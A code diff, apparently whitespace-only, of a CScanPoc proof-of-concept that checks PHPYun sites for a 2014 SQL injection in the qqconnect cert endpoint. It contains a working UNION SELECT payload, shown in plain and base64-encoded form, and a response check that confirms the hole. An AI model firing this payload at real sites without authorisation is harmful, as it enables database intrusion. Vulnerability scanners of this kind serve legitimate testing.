@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHPYun_0005' # 平台漏洞编号，留空
+    vuln_id = 'PHPYun_0005'  # 平台漏洞编号，留空
     name = 'PHPYun SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-02-07'  # 漏洞公布时间
     desc = '''
         在/model/qqconnect.class.php文件中：
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PHPYun'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '271b1804-ee28-4edb-abd3-2296829806ab'
@@ -32,21 +34,22 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #id是ztz' and 1=2 union select md5(c),2,3,4,5,6,7,8,9;#|ztz的base64编码
+
+            # id是ztz' and 1=2 union select md5(c),2,3,4,5,6,7,8,9;#|ztz的base64编码
             payload = '?M=qqconnect&C=cert&id=enR6JyBhbmQgMT0yIHVuaW9uIHNlbGVjdCBtZDUoYyksMiwzLDQsNSw2LDcsOCw5OyN8enR6'
             url = self.target + payload
             r = requests.get(url)
 
             if '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))       
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
